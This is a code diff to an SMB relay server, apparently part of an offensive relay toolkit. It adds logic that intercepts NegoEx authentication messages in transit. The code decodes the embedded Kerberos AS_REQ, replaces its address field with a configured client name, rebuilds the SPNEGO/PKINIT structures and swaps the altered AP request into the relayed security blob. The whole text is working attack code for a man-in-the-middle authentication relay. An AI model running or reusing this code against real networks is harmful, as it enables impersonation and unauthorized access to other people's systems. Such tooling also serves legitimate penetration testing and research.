@@ -20,7 +20,8 @@ from __future__ import division
 from __future__ import print_function
 from threading import Thread
 
-from utils.newUtils.negoex import parse_mechToken, NegoExMessageType
+from utils.newUtils.NegoExStructs import WST_EXCHANGE_MESSAGE
+from utils.newUtils.negoex import parse_mechToken, NegoExMessageType, SPNEGO_PKINIT_REP, generateAPRequest
 
 try:
     import ConfigParser
@@ -275,6 +276,44 @@ class SMBRelayServer(Thread):
         client = connData['SMBClient']
 
         messageTypes = parse_mechToken(token.hex())
+
+        if self.config.clientName:
+            if NegoExMessageType.MESSAGE_TYPE_AP_REQUEST in messageTypes and NegoExMessageType.MESSAGE_TYPE_VERIFY not in messageTypes:
+                newName = self.config.clientName
+                newName += " " * (16 - len(newName))
+                headers = securityBlob.hex().split("".join("{:02x}".format(ord(c)) for c in 'NEGOEXTS'))
+                idx = -1
+                for i in headers:
+                    idx += 1
+                    if i[:8] == '05000000':  # AP_REQUEST
+                        savedData = i[:112]
+                        ExchangeData = i[112:]
+                        KerberosData = ExchangeData[28:]
+                        break
+                from minikerberos.protocol.asn1_structs import AS_REQ as AS_REQ1
+                from asn1crypto import algos, core
+                try:
+                    decodedTGT = AS_REQ1().load(bytes.fromhex(KerberosData))
+                    decodedTGTStruct = decodedTGT.native
+                    decodedTGTStruct['req-body']['addresses'][0]['address'] = newName.encode('utf-8')
+                    req = {'kerberos-v5': algos.DigestAlgorithmId('1.3.6.1.5.2.7'), 'null': core.Null(),
+                           'Kerberos': AS_REQ1(decodedTGTStruct)}
+                    req = SPNEGO_PKINIT_REP(req)
+
+                    # copy negoEx message to create new message
+                    currentMessage = "".join("{:02x}".format(ord(c)) for c in 'NEGOEXTS') + headers[idx]
+                    negoMessage = WST_EXCHANGE_MESSAGE.from_buffer_copy(bytes.fromhex(currentMessage))
+                    newApReq = generateAPRequest(req.dump().hex(), negoMessage)
+
+                    # remove NEGOEXTS bytes as we are going to add them back when joining all the messages
+                    newApReq = newApReq[16:]
+
+                    headers[idx] = newApReq
+                    newSecurityBlob = ("".join("{:02x}".format(ord(c)) for c in 'NEGOEXTS')).join(headers)
+                    securityBlob = bytes.fromhex(newSecurityBlob)
+                except Exception as e:
+                    print(e)
+                    return
 
         if NegoExMessageType.MESSAGE_TYPE_VERIFY in messageTypes:
             clientResponse, errorCode = self.do_nego_auth(client, securityBlob, connData['CHALLENGE_MESSAGE'])
